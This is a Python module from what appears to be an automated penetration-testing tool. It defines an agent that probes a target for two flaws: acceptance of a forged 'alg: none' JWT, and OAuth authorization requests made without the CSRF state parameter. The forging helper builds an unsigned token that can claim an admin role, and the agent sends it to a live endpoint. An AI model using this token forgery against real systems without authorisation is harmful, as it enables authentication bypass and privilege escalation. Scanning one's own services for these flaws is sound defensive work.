import base64
import json
from typing import List, Dict, Any, Optional
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.traffic.models import IdentityType
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.oauth_jwt")

class OAuthJWTCapabilityAgent(BaseCapabilityAgent):
    """
    Specialized Capability Agent for OAuth 2.0 & JWT Token Security Analysis.
    Tests for JWT 'alg: none' tampering, signature bypass, and OAuth CSRF state parameter omissions.
    """
    def __init__(self, priority: int = 10):
        super().__init__(agent_name="OAuthJWTCapabilityAgent", priority=priority)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="jwt_security_analysis",
                name="JWT Token Security Scrutiny",
                description="Tests JWT tokens for 'alg: none' tampering and weak verification implementations",
                priority=self.priority,
                tags=["jwt", "auth", "tokens"]
            ),
            Capability(
                id="oauth_state_verification",
                name="OAuth 2.0 State Parameter Check",
                description="Verifies whether OAuth authorization flows enforce CSRF state token checks",
                priority=self.priority,
                tags=["oauth", "csrf", "authentication"]
            )
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[OAuthJWTCapabilityAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        session_mgr = context.session_manager

        user_ident = session_mgr.get_identity_by_type(IdentityType.STANDARD_USER_A)
        token = user_ident.credentials.bearer_token if (user_ident and user_ident.credentials) else "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

        target_url = f"https://{context.asset}/api/v1/user/me"

        if capability_id == "jwt_security_analysis":
            # Test 1: Generate 'alg: none' tampered token
            tampered_token = self._forge_none_alg_jwt(token)

            exch = await http_client.send_as_identity(
                identity_id="custom_jwt_test",
                method="GET",
                url=target_url,
                headers={"Authorization": f"Bearer {tampered_token}"}
            )

            status = exch.response.status_code if exch.response else 0
            is_vuln = (status == 200)
            confidence = 0.95 if is_vuln else 0.0
            reasoning = (
                f"JWT 'alg: none' vulnerability detected! Server accepted forged unsigned JWT token (HTTP {status})."
                if is_vuln else
                f"Server properly rejected 'alg: none' forged JWT token (HTTP {status})."
            )

            return {
                "status": "COMPLETED",
                "agent": self.name,
                "capability": capability_id,
                "asset": context.asset,
                "is_vulnerable": is_vuln,
                "confidence_score": confidence,
                "evidence": {
                    "target_url": target_url,
                    "forged_token": tampered_token,
                    "reasoning": reasoning,
                    "evidence_exchange": exch.to_dict()
                }
            }

        elif capability_id == "oauth_state_verification":
            oauth_url = f"https://{context.asset}/oauth/authorize?response_type=code&client_id=test_client&redirect_uri=https://{context.asset}/callback"
            # Omit 'state' parameter to test for CSRF risk
            exch = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method="GET",
                url=oauth_url
            )
            status = exch.response.status_code if exch.response else 0
            is_vuln = (status == 200)
            confidence = 0.85 if is_vuln else 0.0
            reasoning = (
                f"OAuth flow accepted authorization request without mandatory 'state' CSRF protection parameter."
                if is_vuln else
                f"OAuth flow properly requires or enforces 'state' parameter."
            )

            return {
                "status": "COMPLETED",
                "agent": self.name,
                "capability": capability_id,
                "asset": context.asset,
                "is_vulnerable": is_vuln,
                "confidence_score": confidence,
                "evidence": {
                    "target_url": oauth_url,
                    "reasoning": reasoning,
                    "evidence_exchange": exch.to_dict()
                }
            }

        return {"status": "SKIPPED", "agent": self.name, "capability": capability_id}

    def _forge_none_alg_jwt(self, original_jwt: str) -> str:
        parts = original_jwt.split(".")
        if len(parts) < 2:
            header_b64 = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode("utf-8").rstrip("=")
            payload_b64 = base64.urlsafe_b64encode(b'{"user_id":"admin","role":"admin"}').decode("utf-8").rstrip("=")
            return f"{header_b64}.{payload_b64}."
        
        # Override header with alg: none
        header_b64 = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode("utf-8").rstrip("=")
        return f"{header_b64}.{parts[1]}."
